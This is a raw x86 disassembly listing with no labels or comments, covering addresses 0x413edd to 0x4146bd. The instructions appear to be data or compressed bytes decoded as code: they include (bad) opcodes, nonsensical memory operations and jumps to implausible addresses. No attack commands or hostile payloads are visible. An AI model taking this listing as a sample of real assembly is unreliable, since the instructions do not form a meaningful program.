  413edd:	test   al,0xd1
  413edf:	dec    ebp
  413ee0:	xor    eax,0x661a4d00
  413ee5:	add    BYTE PTR [edx],0x18
  413ee8:	dec    ebp
  413ee9:	sub    BYTE PTR [eax+0xa01000],0x1
  413ef0:	mov    WORD PTR [ecx+edx*1],ss
  413ef3:	push   ss
  413ef4:	or     DWORD PTR [eax],edx
  413ef6:	push   eax
  413ef7:	and    DWORD PTR [ecx+0x8],eax
  413efa:	add    BYTE PTR [eax],cl
  413efc:	mov    BYTE PTR [edx],dl
  413efe:	call   DWORD PTR ds:0x421ba8
  413f04:	add    al,0x44
  413f06:	or     BYTE PTR [eax],al
  413f08:	add    BYTE PTR [eax],bl
  413f0a:	inc    eax
  413f0b:	add    BYTE PTR [ecx],cl
  413f0d:	add    al,dl
  413f0f:	add    eax,DWORD PTR [eax]
  413f11:	push   esp
  413f12:	dec    ecx
  413f13:	and    BYTE PTR [eax+0x0],0x3a
  413f17:	sub    BYTE PTR [ecx-0x77e7966c],al
  413f1d:	mov    esp,0xe0654200
  413f22:	add    al,al
  413f24:	and    BYTE PTR [ebx+0x44],cl
  413f27:	and    dl,BYTE PTR [eax]
  413f29:	or     DWORD PTR [esi-0x1e],ebp
  413f2c:	adc    dl,bh
  413f2e:	add    BYTE PTR [eax-0x71fffbd0],cl
  413f34:	push   0x41084609
  413f39:	add    BYTE PTR [eax],dl
  413f3b:	xor    DWORD PTR [eax],edx
  413f3d:	add    BYTE PTR [eax-0x5e7ff5d8],cl
  413f43:	add    al,0x10
  413f45:	push   edx
  413f46:	push   es
  413f47:	add    al,al
  413f49:	and    BYTE PTR [eax],al
  413f4b:	push   es
  413f4c:	and    BYTE PTR [ecx],0x10
  413f4f:	push   0x1560050
  413f54:	pop    eax
  413f55:	(bad)  
  413f56:	mov    al,ds:0x1816660
  413f5b:	add    BYTE PTR [eax+0x41882018],al
  413f61:	add    BYTE PTR [eax],ah
  413f63:	and    DWORD PTR ds:0x454303a8,eax
  413f69:	xor    al,0x3
  413f6b:	push   eax
  413f6c:	or     al,0x18
  413f6e:	adc    BYTE PTR [eax+0x68c14022],al
  413f74:	pushf  
  413f75:	and    BYTE PTR [ecx+0x2083000],ah
  413f7b:	and    BYTE PTR [eax],al
  413f7d:	adc    DWORD PTR [ecx+edx*4],eax
  413f80:	dec    eax
  413f81:	add    BYTE PTR [edx-0x78],cl
  413f84:	or     ch,BYTE PTR [eax]
  413f86:	push   ss
  413f87:	adc    dl,al
  413f89:	nop
  413f8a:	add    BYTE PTR [ecx-0x54fe7f80],al
  413f90:	or     DWORD PTR [ecx-0x3f],edx
  413f93:	add    al,0xd0
  413f95:	and    eax,0x84000800
  413f9a:	xor    BYTE PTR [edx],al
  413f9c:	sbb    al,0x9
  413f9e:	inc    edx
  413f9f:	adc    BYTE PTR [eax],ah
  413fa1:	xor    BYTE PTR [eax+eax*2],0x8
  413fa5:	lods   al,BYTE PTR ds:[esi]
  413fa6:	or     al,dl
  413fa8:	adc    al,0x14
  413faa:	inc    eax
  413fab:	add    BYTE PTR [ecx],al
  413fad:	dec    eax
  413fae:	adc    eax,DWORD PTR [esp+ecx*4+0xc]
  413fb2:	push   es
  413fb3:	or     BYTE PTR [eax],al
  413fb5:	add    DWORD PTR [esi],ebx
  413fb7:	xor    cl,al
  413fb9:	stos   BYTE PTR es:[edi],al
  413fba:	gs inc ebp
  413fbc:	or     DWORD PTR [ecx+eax*8],eax
  413fbf:	or     BYTE PTR [esi+0x4010803a],cl
  413fc5:	mov    al,0x21
  413fc7:	sub    BYTE PTR [ecx-0x357fadfb],ch
  413fcd:	add    al,BYTE PTR [ecx]
  413fcf:	and    BYTE PTR [eax],bl
  413fd1:	aaa    
  413fd2:	push   es
  413fd3:	rcl    DWORD PTR ds:0x403360a2,0x2
  413fda:	add    DWORD PTR [eax+ecx*2],ebp
  413fdd:	rol    DWORD PTR [edx+0x0],0xb9
  413fe1:	add    al,BYTE PTR [edx]
  413fe3:	add    BYTE PTR [eax],cl
  413fe5:	add    BYTE PTR [eax+eax*1+0x2],ch
  413fe9:	inc    esp
  413fea:	add    al,0x90
  413fec:	add    al,0x0
  413fee:	push   ecx
  413fef:	or     DWORD PTR [edx],eax
  413ff1:	dec    ebp
  413ff2:	dec    eax
  413ff3:	and    BYTE PTR [eax+edx*4],0x60
  413ff7:	mov    al,ds:0x19889020
  413ffc:	add    DWORD PTR [eax+0x4],esp
  413fff:	inc    ecx
  414000:	add    al,BYTE PTR [eax]
  414002:	and    BYTE PTR [eax+0x8],cl
  414005:	xor    ah,BYTE PTR [edx]
  414007:	mov    BYTE PTR [eax],al
  414009:	xor    BYTE PTR [ebp-0x3efdbffc],dl
  41400f:	push   ecx
  414010:	loope  0x413f96
  414012:	add    DWORD PTR [eax+0x30],0x20800301
  414019:	add    al,BYTE PTR [eax+eax*1]
  41401c:	add    BYTE PTR [eax+0x12318102],cl
  414022:	xor    al,0xa4
  414024:	mov    dl,0xcc
  414026:	adc    DWORD PTR [edx+0x1000023],esp
  41402c:	mov    al,ds:0x142440d4
  414031:	dec    eax
  414032:	leave  
  414033:	rcr    BYTE PTR [edx],0x3
  414036:	add    DWORD PTR [edi+0x4],esp
  414039:	add    BYTE PTR [eax],dl
  41403b:	and    DWORD PTR [ebp+0x2],eax
  41403e:	add    BYTE PTR ds:0x8452090c,0x42
  414045:	inc    eax
  414046:	sub    BYTE PTR [eax],al
  414048:	add    eax,0xd8801200
  41404d:	nop
  41404e:	dec    eax
  41404f:	inc    edx
  414050:	adc    BYTE PTR [esp-0x6dc5ff90],dl
  414057:	sbb    BYTE PTR [edx+0xa],dl
  41405a:	jo     0x4140cc
  41405c:	add    DWORD PTR [ecx],ecx
  41405e:	and    BYTE PTR [edx],al
  414060:	add    BYTE PTR [eax],al
  414062:	add    eax,0xa5211320
  414067:	and    BYTE PTR [edx],ah
  414069:	xor    cl,dl
  41406b:	nop
  41406c:	add    DWORD PTR [ebp+0x63440553],0x2a
  414073:	add    al,dl
  414075:	add    BYTE PTR [eax],cl
  414077:	dec    eax
  414078:	add    BYTE PTR [eax+0xd],al
  41407b:	mov    ah,BYTE PTR [ebp*1+0x3408124]
  414082:	push   0x0
  414084:	adc    ch,BYTE PTR [eax+0x19280800]
  41408a:	add    BYTE PTR ds:0x404c4844,al
  414090:	ror    eax,0x9
  414093:	and    BYTE PTR [ecx],cl
  414095:	add    BYTE PTR [edx],dl
  414097:	sldt   WORD PTR [edx+0x44068220]
  41409e:	add    DWORD PTR [ecx+edx*8+0x36],eax
  4140a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a3:	ss push 0x811051
  4140a9:	inc    eax
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	lea    eax,[edx+eax*1+0x0]
  4140b0:	add    BYTE PTR [eax],al
  4140b2:	adc    al,0x2
  4140b4:	cmp    DWORD PTR ds:0x42140a00,ecx
  4140ba:	mov    al,ds:0x16818c0
  4140bf:	add    cl,BYTE PTR [eax]
  4140c1:	adc    dl,BYTE PTR [eax+0x40]
  4140c4:	push   cs
  4140c5:	sbb    ah,dl
  4140c7:	inc    eax
  4140c8:	test   BYTE PTR [eax+0x60],bh
  4140cb:	or     bl,ah
  4140cd:	adc    eax,DWORD PTR [eax+0x0]
  4140d0:	rol    BYTE PTR [edx+eax*1+0x0],0xc9
  4140d5:	add    BYTE PTR [edx-0x28],al
  4140d8:	pop    esp
  4140d9:	mov    al,al
  4140db:	add    BYTE PTR [eax],cl
  4140dd:	mov    BYTE PTR ds:0x103a0100,cl
  4140e3:	adc    BYTE PTR [ecx],0x11
  4140e6:	and    DWORD PTR [ecx],edx
  4140e8:	push   eax
  4140e9:	dec    ebx
  4140ea:	or     DWORD PTR [eax+0x3800321],esp
  4140f0:	add    esp,DWORD PTR [edx]
  4140f2:	add    BYTE PTR [ebp-0x68],dl
  4140f5:	adc    BYTE PTR [eax+0x24],al
  4140f8:	adc    eax,DWORD PTR [ebx]
  4140fa:	push   es
  4140fb:	sbb    al,BYTE PTR [eax+0x60856020]
  414101:	and    BYTE PTR [eax+edx*1],dl
  414104:	add    al,0x30
  414106:	add    al,0x47
  414108:	adc    DWORD PTR [esi],edx
  41410a:	adc    al,BYTE PTR [edx]
  41410c:	sbb    al,BYTE PTR [eax]
  41410e:	and    ah,BYTE PTR [esp+eax*2]
  414111:	add    al,BYTE PTR [eax-0x74bbfff6]
  414117:	push   ecx
  414118:	add    BYTE PTR [eax],al
  41411a:	xchg   BYTE PTR [eax],al
  41411c:	push   edx
  41411d:	fmul   DWORD PTR [eax+0x27252da0]
  414123:	inc    ecx
  414124:	add    BYTE PTR [edx+0x4],al
  414127:	add    BYTE PTR [ebp+0xa00820],dl
  41412d:	xor    DWORD PTR [eax],ebp
  41412f:	add    BYTE PTR [eax+0x48],al
  414132:	adc    BYTE PTR [edx-0x7e],al
  414135:	inc    edx
  414136:	or     DWORD PTR [eax+0x8],ebp
  414139:	push   ecx
  41413a:	add    al,BYTE PTR [eax]
  41413c:	clc    
  41413d:	sub    BYTE PTR [eax],ah
  41413f:	or     BYTE PTR [ecx+eax*4],bh
  414142:	mov    dl,0xa0
  414144:	mov    cl,0x44
  414146:	add    BYTE PTR [eax],ch
  414148:	mov    BYTE PTR [eax+0x2a8e4419],al
  41414e:	push   eax
  41414f:	rol    BYTE PTR [eax+0x11296405],0x2a
  414156:	and    BYTE PTR [ecx+eax*1],dh
  414159:	add    BYTE PTR [edx+eax*1+0x2892e02],al
  414160:	inc    esp
  414161:	pushf  
  414162:	add    BYTE PTR [eax],al
  414164:	inc    ebx
  414165:	xor    BYTE PTR [eax+0x602062d3],al
  41416b:	add    al,BYTE PTR [eax]
  41416d:	and    al,BYTE PTR [eax]
  41416f:	inc    edi
  414170:	or     ah,0x20
  414173:	xchg   ecx,eax
  414174:	or     al,0x0
  414176:	pop    es
  414177:	pop    ebx
  414178:	adc    BYTE PTR [edx],0xc2
  41417b:	call   0xd:0xa08980
  414182:	pop    edx
  414183:	and    BYTE PTR [ecx],cl
  414185:	add    DWORD PTR [edx],esp
  414187:	push   cs
  414188:	push   esp
  414189:	or     BYTE PTR [ebp+0x1901800],cl
  41418f:	bound  eax,QWORD PTR [eax]
  414191:	pusha  
  414192:	and    BYTE PTR [edx],0x84
  414195:	add    al,0x1
  414197:	lock adc BYTE PTR [eax+0x222b880a],dl
  41419e:	add    eax,0x2a414103
  4141a3:	sbb    al,0x0
  4141a5:	stos   DWORD PTR es:[edi],eax
  4141a6:	adc    al,BYTE PTR [eax]
  4141a8:	and    BYTE PTR [esi+0x2c01140a],al
  4141ae:	add    DWORD PTR [eax],ebx
  4141b0:	xor    BYTE PTR [edx],cl
  4141b2:	leave  
  4141b3:	add    ch,BYTE PTR [ecx+edx*1-0x7f5bf9cf]
  4141ba:	jmp    0x85a544eb
  4141bf:	sub    al,0x0
  4141c1:	pop    ecx
  4141c2:	push   eax
  4141c3:	sub    BYTE PTR [esp+ebp*1],dl
  4141c6:	mov    WORD PTR [esi],fs
  4141c8:	nop
  4141c9:	add    al,BYTE PTR [esi]
  4141cb:	adc    BYTE PTR [eax],al
  4141cd:	enter  0xc40,0xa9
  4141d1:	xor    BYTE PTR [eax+0x0],al
  4141d4:	adc    BYTE PTR [eax],bl
  4141d6:	add    edx,DWORD PTR [ecx]
  4141d8:	adc    BYTE PTR [eax],al
  4141da:	add    BYTE PTR [ecx-0x7f7fbf78],al
  4141e0:	mov    al,BYTE PTR [ecx+0x1c101545]
  4141e6:	push   es
  4141e7:	inc    esp
  4141e8:	add    BYTE PTR [eax],al
  4141ea:	adc    eax,0x30102040
  4141ef:	add    BYTE PTR [eax],cl
  4141f1:	and    BYTE PTR [ecx],al
  4141f3:	inc    edx
  4141f4:	add    BYTE PTR [eax],0x0
  4141f7:	rcl    BYTE PTR [edx],1
  4141f9:	retf   0xd012
  4141fc:	add    BYTE PTR [ecx+eax*2-0x6e3bfeea],al
  414203:	push   eax
  414204:	and    al,0x3c
  414206:	add    BYTE PTR [eax],ah
  414208:	mov    BYTE PTR [ecx],dh
  41420a:	inc    eax
  41420b:	add    al,0xa
  41420d:	es add al,0xc0
  414210:	and    al,0x24
  414212:	inc    ecx
  414213:	rol    BYTE PTR [eax+0x0],cl
  414216:	rol    al,0x1
  414219:	or     al,0x10
  41421b:	test   BYTE PTR [ecx+0x12810003],al
  414221:	add    DWORD PTR [eax+0x3310140],eax
  414227:	add    BYTE PTR [eax],cl
  414229:	inc    ecx
  41422a:	imul   eax,DWORD PTR [eax],0x88b00a0
  414230:	adc    al,BYTE PTR [esi+0x9]
  414233:	add    BYTE PTR [eax-0x56ffd6f8],0xd0
  41423a:	or     DWORD PTR ds:0x120d901,0x209a300a
  414244:	add    al,0x1
  414246:	ror    esp,0x10
  414249:	and    BYTE PTR [ecx],al
  41424b:	adc    al,BYTE PTR [edx]
  41424d:	test   al,0x58
  41424f:	mov    eax,ds:0xe00c0018
  414254:	add    al,0x6c
  414256:	or     DWORD PTR [eax+0x251900c5],edx
  41425c:	rol    DWORD PTR [edx],0x9
  41425f:	inc    esp
  414260:	or     al,BYTE PTR [eax]
  414262:	adc    DWORD PTR [eax-0x20],ecx
  414265:	add    al,0x9
  414267:	add    BYTE PTR [edx+0x41],0x91
  41426b:	and    cl,cl
  41426d:	loope  0x414200
  41426f:	inc    eax
  414270:	mov    al,ds:0x90150044
  414275:	adc    BYTE PTR [ecx],dl
  414277:	mov    ds:0xa2320011,eax
  41427c:	add    DWORD PTR [eax+ecx*1+0x140287d],esi
  414283:	and    ah,BYTE PTR [edi-0x75]
  414286:	les    eax,FWORD PTR [ecx-0x754ed8ff]
  41428c:	sub    al,0x43
  41428e:	add    edx,DWORD PTR [eax+0x0]
  414291:	loope  0x414293
  414293:	and    ecx,DWORD PTR [eax+0x450110c8]
  414299:	mov    al,ds:0x1022220c
  41429e:	rcl    BYTE PTR [eax+0x4d341489],1
  4142a4:	mov    al,ds:0xa949a8
  4142a9:	add    al,0x50
  4142ab:	adc    BYTE PTR [eax+0x10],al
  4142ae:	mov    BYTE PTR ds:0x24002280,al
  4142b4:	add    BYTE PTR [ecx],al
  4142b6:	fadd   QWORD PTR [eax+0x12]
  4142b9:	add    BYTE PTR [ebx-0x6fdccbc0],0x84
  4142c0:	add    dl,BYTE PTR [eax+0x8008000]
  4142c6:	nop
  4142c7:	push   es
  4142c8:	or     al,BYTE PTR [edx]
  4142ca:	or     DWORD PTR [eax],0xc80400a2
  4142d0:	adc    cl,BYTE PTR [eax+0x0]
  4142d3:	sub    DWORD PTR [edx],eax
  4142d5:	pusha  
  4142d6:	mov    al,ds:0x818880
  4142db:	and    DWORD PTR [edx-0x5f77f5d0],esp
  4142e1:	add    BYTE PTR [ecx],ah
  4142e3:	sbb    eax,DWORD PTR [ecx]
  4142e5:	sub    al,BYTE PTR [eax]
  4142e7:	ror    DWORD PTR [ecx],0xa5
  4142ea:	inc    esi
  4142eb:	push   eax
  4142ec:	test   BYTE PTR [eax-0x2c],dl
  4142ef:	adc    al,0x8a
  4142f1:	or     BYTE PTR [eax],ah
  4142f3:	add    BYTE PTR [eax-0x7ef7ff70],0xa
  4142fa:	test   al,0x4
  4142fc:	nop
  4142fd:	add    BYTE PTR [eax-0x70],al
  414300:	adc    DWORD PTR [ecx+eax*2+0x882100],ecx
  414307:	sub    DWORD PTR [edx],eax
  414309:	sub    BYTE PTR [edx+0x40040102],0x80
  414310:	push   0x6080018c
  414315:	adc    BYTE PTR [ebx],cl
  414317:	sub    al,bl
  414319:	add    DWORD PTR [eax+eax*1],0x18209801
  414320:	add    BYTE PTR [eax],al
  414322:	push   es
  414323:	inc    ecx
  414324:	dec    ecx
  414325:	add    ah,BYTE PTR [esi+eax*4]
  414328:	inc    ebp
  414329:	add    DWORD PTR es:[ecx],ecx
  41432c:	dec    ebp
  41432d:	add    BYTE PTR [eax+ecx*8],0x91
  414331:	sub    BYTE PTR [eax+0x2],bh
  414334:	inc    ecx
  414335:	add    al,0x2d
  414337:	inc    esp
  414338:	add    BYTE PTR [eax],al
  41433a:	and    ah,BYTE PTR [edx-0x6e6bfe40]
  414340:	inc    ecx
  414341:	adc    al,0x30
  414343:	add    BYTE PTR [eax-0x58],cl
  414346:	js     0x414348
  414348:	push   cs
  414349:	add    BYTE PTR [eax],al
  41434b:	add    al,BYTE PTR [ecx+eax*1]
  41434e:	arpl   WORD PTR [edx],ax
  414350:	gs dec eax
  414352:	add    esp,DWORD PTR [eax]
  414354:	dec    edx
  414355:	add    BYTE PTR [eax],0x9
  414358:	inc    eax
  414359:	xchg   ecx,eax
  41435a:	xchg   ecx,eax
  41435b:	and    dl,BYTE PTR [eax]
  41435d:	adc    al,0x92
  41435f:	and    BYTE PTR [eax+0x908d217],0x0
  414366:	add    BYTE PTR [edi+0x5],0xc0
  41436a:	adc    eax,0x81c04450
  41436f:	sbb    BYTE PTR [eax],bl
  414371:	popa   
  414372:	cmp    al,BYTE PTR [ebp+0x24]
  414375:	pop    eax
  414376:	or     al,BYTE PTR [eax]
  414378:	add    BYTE PTR [eax+0x2008500a],al
  41437e:	add    BYTE PTR [eax],al
  414380:	add    BYTE PTR [eax],cl
  414382:	and    DWORD PTR [eax-0x4fbffb7d],eax
  414388:	mov    ds:0x88408,eax
  41438d:	or     BYTE PTR [edx+edx*1],0x0
  414391:	add    al,BYTE PTR [edx+0x22]
  414394:	add    BYTE PTR [eax+edi*8+0x29],dh
  414398:	push   es
  414399:	add    al,0x0
  41439b:	dec    eax
  41439c:	or     BYTE PTR [eax],0x0
  41439f:	add    eax,DWORD PTR [ebx]
  4143a1:	and    BYTE PTR [eax+0x810022],al
  4143a7:	xchg   BYTE PTR ds:0x3020400,ah
  4143ad:	sub    DWORD PTR [eax],0x92202405
  4143b3:	adc    al,BYTE PTR [eax+0x2]
  4143b6:	add    eax,DWORD PTR [eax]
  4143b8:	xchg   ecx,eax
  4143b9:	adc    al,0x8
  4143bb:	fld    DWORD PTR [ebx]
  4143bd:	adc    BYTE PTR fs:[edx-0x7bb79bff],ch
  4143c4:	or     BYTE PTR ds:0x3421041a,cl
  4143ca:	adc    esp,DWORD PTR [eax]
  4143cc:	add    BYTE PTR [eax],al
  4143ce:	sub    BYTE PTR [esi+0x1022249],al
  4143d4:	adc    BYTE PTR [ecx+0x4d14a420],al
  4143da:	xor    BYTE PTR [edx],cl
  4143dc:	adc    BYTE PTR ds:0x4502424a,al
  4143e2:	rol    DWORD PTR cs:[eax],1
  4143e5:	add    dh,BYTE PTR [eax-0x56]
  4143e8:	inc    eax
  4143e9:	dec    edx
  4143ea:	or     ah,BYTE PTR [eax-0x1ddb3cdb]
  4143f0:	or     edx,DWORD PTR [eax]
  4143f2:	add    BYTE PTR [eax],al
  4143f4:	add    BYTE PTR [ecx-0x7bf3ff7e],al
  4143fa:	inc    edx
  4143fb:	dec    edx
  4143fc:	nop
  4143fd:	dec    eax
  4143fe:	and    cl,BYTE PTR [ecx+0x19]
  414401:	xchg   edx,eax
  414402:	dec    eax
  414403:	rol    DWORD PTR [ebp+edx*1+0x44a10011],cl
  41440a:	inc    eax
  41440b:	adc    BYTE PTR [eax+0x5],ah
  41440e:	add    BYTE PTR [eax],cl
  414410:	xchg   esp,eax
  414411:	add    al,0x11
  414413:	rol    BYTE PTR [eax+0x21207164],0x40
  41441a:	sbb    al,BYTE PTR [eax]
  41441c:	add    BYTE PTR [eax+edx*1],al
  41441f:	xor    BYTE PTR [eax-0x20],al
  414422:	add    BYTE PTR [eax+0x18],al
  414425:	sub    BYTE PTR [edi+0x150000],ch
  41442b:	adc    DWORD PTR ds:0x4a5008c4,ebx
  414431:	sub    BYTE PTR [edx],cl
  414433:	adc    al,0x0
  414435:	and    BYTE PTR [eax-0x46],0x40
  414439:	inc    ebp
  41443a:	jb     0x41443d
  41443c:	sahf   
  41443d:	mov    ds:0x6808024,al
  414442:	push   ss
  414443:	pop    eax
  414444:	bound  edx,QWORD PTR [ecx]
  414446:	stos   BYTE PTR es:[edi],al
  414447:	add    al,cl
  414449:	or     al,BYTE PTR [eax]
  41444b:	inc    edx
  41444c:	nop
  41444d:	cdq    
  41444e:	mov    BYTE PTR [edx-0x32],al
  414451:	add    BYTE PTR [eax-0x7efdf553],cl
  414457:	rcl    dl,0x8b
  41445a:	add    DWORD PTR [eax+0xc],eax
  41445d:	adc    eax,DWORD PTR [ecx]
  41445f:	push   eax
  414460:	add    dl,BYTE PTR [edx]
  414462:	and    eax,0x98946800
  414467:	push   eax
  414468:	or     eax,0xb6090000
  41446d:	dec    esp
  41446e:	rol    BYTE PTR [ecx],0x0
  414471:	adc    BYTE PTR [eax+0x42307f00],al
  414477:	mov    al,ds:0x630419
  41447c:	and    DWORD PTR [esi],esp
  41447e:	lds    edx,FWORD PTR [eax]
  414480:	inc    esp
  414481:	nop
  414482:	leave  
  414483:	add    BYTE PTR [edx+eiz*1+0x22140841],cl
  41448a:	rcr    BYTE PTR [edx],cl
  41448c:	or     DWORD PTR [edx+0xa48322],ecx
  414492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414493:	pop    edx
  414494:	bound  eax,QWORD PTR [eax-0x71]
  414497:	adc    eax,0x1640098d
  41449c:	add    BYTE PTR [ecx],al
  41449e:	dec    edx
  41449f:	adc    eax,DWORD PTR fs:[esi]
  4144a2:	mov    cl,0x52
  4144a4:	add    BYTE PTR [edx],ch
  4144a6:	pop    eax
  4144a7:	add    DWORD PTR [edi+0x1602b445],eax
  4144ad:	add    BYTE PTR [eax+0x18],ah
  4144b0:	push   edx
  4144b1:	dec    esp
  4144b2:	inc    eax
  4144b3:	adc    BYTE PTR [eax+0x55028081],cl
  4144b9:	or     DWORD PTR [eax],eax
  4144bb:	sub    BYTE PTR [eax],cl
  4144bd:	add    al,BYTE PTR [esi+0x0]
  4144c0:	xor    eax,eax
  4144c2:	add    DWORD PTR ds:0x21008f40,eax
  4144c8:	mov    al,ds:0x12c82000
  4144cd:	rcl    DWORD PTR [eax+0x40242452],1
  4144d3:	and    al,0x0
  4144d5:	retf   
  4144d6:	xchg   esp,eax
  4144d7:	add    dh,BYTE PTR [edi+0x4]
  4144da:	add    eax,DWORD PTR [eax]
  4144dc:	and    al,0xc
  4144de:	xor    BYTE PTR [eax+0x2ca110c],al
  4144e4:	ret    
  4144e5:	push   ss
  4144e6:	add    al,BYTE PTR [ecx+0x50]
  4144e9:	dec    eax
  4144ea:	push   ebp
  4144eb:	and    BYTE PTR [edx],ah
  4144ed:	add    DWORD PTR ds:0x5400a201,eax
  4144f3:	dec    eax
  4144f4:	push   0x38100880
  4144f9:	add    DWORD PTR [eax],eax
  4144fb:	add    DWORD PTR [eax],edx
  4144fd:	sub    BYTE PTR [ecx],0x10
  414500:	add    ah,ch
  414502:	stc    
  414503:	rcr    DWORD PTR [eax],cl
  414505:	mov    BYTE PTR [eax],al
  414507:	add    BYTE PTR [eax],ah
  414509:	les    eax,FWORD PTR [eax+0x330c0100]
  41450f:	add    BYTE PTR [eax],dh
  414511:	add    BYTE PTR [eax],ah
  414513:	inc    ecx
  414514:	pop    eax
  414515:	add    al,BYTE PTR [edx]
  414517:	or     al,BYTE PTR [eax]
  414519:	xchg   esp,eax
  41451a:	inc    esp
  41451b:	sbb    cl,ah
  41451d:	adc    al,BYTE PTR ds:0x220a260c
  414523:	adc    BYTE PTR [edx+0x421100],bl
  414529:	and    BYTE PTR [ebp+0x8],al
  41452c:	or     BYTE PTR [eax],ah
  41452e:	rol    BYTE PTR [ecx],0x46
  414531:	and    BYTE PTR [eax],0x40
  414534:	adc    BYTE PTR [edx+0x2b],al
  414537:	inc    esp
  414538:	inc    ebx
  414539:	or     ch,BYTE PTR [eax]
  41453b:	cmp    DWORD PTR [eax],eax
  41453d:	nop
  41453e:	popa   
  41453f:	add    al,0x64
  414541:	mov    ecx,0x120780a1
  414546:	and    al,0x8
  414548:	add    DWORD PTR [ebx],edx
  41454a:	add    BYTE PTR [eax],al
  41454c:	nop
  41454d:	push   ss
  41454e:	inc    esi
  41454f:	adc    BYTE PTR [esi],al
  414551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414552:	or     dl,BYTE PTR [eax]
  414554:	push   ss
  414555:	adc    DWORD PTR [eax+0x40],esp
  414558:	and    DWORD PTR [ecx],edx
  41455a:	nop
  41455b:	sbb    al,BYTE PTR [ebp+eiz*1+0x741139]
  414562:	sbb    BYTE PTR [eax-0x78],dl
  414565:	or     BYTE PTR [edx+0x4],al
  414568:	add    BYTE PTR [eax+0x21d523],0x4
  41456f:	add    BYTE PTR [ecx+eax*1],ch
  414572:	add    al,0x2
  414574:	inc    eax
  414575:	add    al,BYTE PTR [ecx]
  414577:	add    edx,DWORD PTR [esp+eiz*4]
  41457a:	dec    ecx
  41457b:	sub    ah,BYTE PTR [eax+eax*8]
  41457e:	and    BYTE PTR [ecx],ah
  414580:	and    BYTE PTR [eax-0x6cdb7dfe],ah
  414586:	dec    edx
  414587:	mov    ds:0x5090402,al
  41458c:	mov    bh,BYTE PTR [eax]
  41458e:	or     BYTE PTR [eax],ah
  414590:	and    al,0x31
  414592:	add    BYTE PTR [edx],dh
  414594:	jl     0x414520
  414596:	or     al,BYTE PTR [esi+0x20]
  414599:	rcl    DWORD PTR [eax],0x68
  41459c:	add    BYTE PTR [eax+eiz*1],al
  41459f:	or     al,BYTE PTR [ecx+ecx*4+0x164448b8]
  4145a6:	inc    eax
  4145a7:	and    al,0x12
  4145a9:	mov    al,ds:0x2a560806
  4145ae:	and    BYTE PTR [edi+0x8055810],al
  4145b4:	popa   
  4145b5:	add    DWORD PTR [eax+0x0],0x35a0100a
  4145bc:	test   BYTE PTR [eax],dl
  4145be:	add    BYTE PTR [eax],al
  4145c0:	and    BYTE PTR [edx],al
  4145c2:	xchg   edx,eax
  4145c3:	sub    BYTE PTR [eax],cl
  4145c5:	add    al,0x2c
  4145c7:	push   cs
  4145c8:	jno    0x4145d6
  4145ca:	add    BYTE PTR [eax+eax*4],dl
  4145cd:	add    BYTE PTR [edx-0x40],dl
  4145d0:	fs inc esp
  4145d2:	add    DWORD PTR [esi],esi
  4145d4:	dec    ecx
  4145d5:	dec    eax
  4145d6:	adc    BYTE PTR [eax+eiz*4],al
  4145d9:	cld    
  4145da:	push   ss
  4145db:	add    eax,0x19600220
  4145e0:	adc    BYTE PTR [eax+0x208203a],ah
  4145e6:	add    DWORD PTR [ecx],esp
  4145e8:	push   eax
  4145e9:	sub    BYTE PTR [eax],al
  4145eb:	add    al,BYTE PTR [ebx+0xa]
  4145ee:	inc    eax
  4145ef:	mov    WORD PTR [edx+0x3c],gs
  4145f2:	inc    eax
  4145f3:	or     bl,al
  4145f5:	nop
  4145f6:	sbb    BYTE PTR [esi+eax*4+0x4000524],0x82
  4145fe:	add    BYTE PTR [esp+edi*4],al
  414601:	add    BYTE PTR [edx],dh
  414603:	adc    BYTE PTR [ebp+0x0],al
  414606:	inc    eax
  414607:	jno    0x414649
  414609:	add    eax,edx
  41460b:	and    BYTE PTR [ecx+0x45],ah
  41460e:	rcl    BYTE PTR [ecx],1
  414610:	add    dl,BYTE PTR [eax]
  414612:	out    0x20,al
  414614:	inc    ebx
  414615:	adc    BYTE PTR [edx],ah
  414617:	sbb    DWORD PTR [eax],0x54813400
  41461d:	dec    esp
  41461e:	inc    eax
  41461f:	add    BYTE PTR [eax+eax*1],al
  414622:	and    BYTE PTR [ecx],al
  414624:	or     DWORD PTR [edx+0x11050441],esp
  41462a:	mov    WORD PTR [edx],fs
  41462c:	add    eax,0x8dc0a3a2
  414631:	shl    BYTE PTR [eax],0x18
  414634:	rol    BYTE PTR [edx+eax*1+0x8],0xa
  414639:	dec    ebx
  41463a:	inc    edx
  41463b:	rcl    DWORD PTR [eax],0x4
  41463e:	inc    eax
  41463f:	aam    0x68
  414641:	add    al,0x23
  414643:	and    DWORD PTR [eax+ebx*1],0x91402400
  41464a:	add    DWORD PTR [edx],0x10a4101
  414650:	add    BYTE PTR [ecx],cl
  414652:	and    DWORD PTR [eax],0x2d70084a
  414658:	add    DWORD PTR [edx+ebp*4-0x72],eax
  41465c:	xor    DWORD PTR [eax],eax
  41465e:	and    BYTE PTR [edx],al
  414660:	fsubr  DWORD PTR [eax]
  414662:	push   esi
  414663:	dec    ecx
  414664:	or     al,0x0
  414666:	pusha  
  414667:	add    bl,BYTE PTR [eax-0x7d7f36bc]
  41466d:	or     DWORD PTR [eax+0x0],0xffffffe3
  414671:	inc    ecx
  414672:	sbb    al,BYTE PTR [ecx+0x0]
  414675:	pusha  
  414676:	push   es
  414677:	pusha  
  414678:	and    BYTE PTR ds:0x82131,ch
  41467e:	and    al,BYTE PTR [eax]
  414680:	inc    edi
  414681:	add    BYTE PTR [eax],cl
  414683:	sbb    BYTE PTR [ecx+0x11],dh
  414686:	(bad)  
  414687:	xor    BYTE PTR fs:[eax-0xe],ah
  41468b:	nop
  41468c:	inc    eax
  41468d:	addr16 add ah,0x4
  414691:	add    BYTE PTR [eax],al
  414693:	bound  eax,QWORD PTR [edx+0x27]
  414696:	push   es
  414697:	or     BYTE PTR [ecx+0xc],0x85
  41469b:	add    BYTE PTR [ecx],ah
  41469d:	sbb    al,al
  41469f:	add    BYTE PTR [eax+0x2008b741],cl
  4146a5:	push   eax
  4146a6:	bound  esi,QWORD PTR [ebp-0x3f7ff9bc]
  4146ac:	ret    
  4146ad:	cdq    
  4146ae:	and    BYTE PTR [ecx-0x7b2c67ec],ah
  4146b4:	add    BYTE PTR [ecx],dl
  4146b6:	ret    0x4305
  4146b9:	sub    dh,BYTE PTR [eax]
  4146bb:	add    BYTE PTR [esi],ah
  4146bd:	xchg   edx,eax
